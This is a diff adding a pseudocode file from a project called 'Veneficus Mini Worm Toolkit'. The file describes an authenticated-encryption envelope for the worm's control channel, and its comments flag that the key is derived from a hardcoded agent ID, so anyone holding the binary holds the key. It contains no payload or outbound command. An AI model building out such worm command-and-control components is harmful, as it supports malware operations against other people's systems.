@@ -1,0 +1,39 @@
+# +--------------------------------------------------------------------------+
+# |                                                                          |
+# |                       Veneficus Mini Worm Toolkit                        |
+# |                                                                          |
+# +--------------------------------------------------------------------------+
+
+# src/channel_crypto.pseudo
+# Authenticated encryption wrapper for the control channel.
+
+TYPE Envelope:
+    key: 32 bytes
+
+Envelope.from_random():
+    fill key from CSPRNG
+
+Envelope.from_key(k):
+    require len(k) == 32
+
+Envelope.from_seed(seed):
+    key = SHA-256(seed)          # no salt, no HKDF  — weak keying
+
+Envelope.seal(plaintext) -> (ciphertext_b64, nonce_b64):
+    nonce = 12 random bytes
+    ciphertext = AES-256-GCM(key, nonce, plaintext)
+    RETURN base64(ciphertext), base64(nonce)
+
+Envelope.open(ct_b64, nonce_b64) -> plaintext | none:
+    authenticate-and-decrypt; none on failure
+
+Envelope.mac(msg) -> b64:
+    HMAC-SHA256(key, msg)
+
+Envelope.check(msg, tag_b64) -> bool:
+    constant-time compare
+
+CONTROL-CHANNEL USE:
+    Envelope.from_seed(AGENT_ID as bytes)
+    # Because AGENT_ID is a plaintext string in the binary,
+    # possession of the PE implies possession of the channel key.
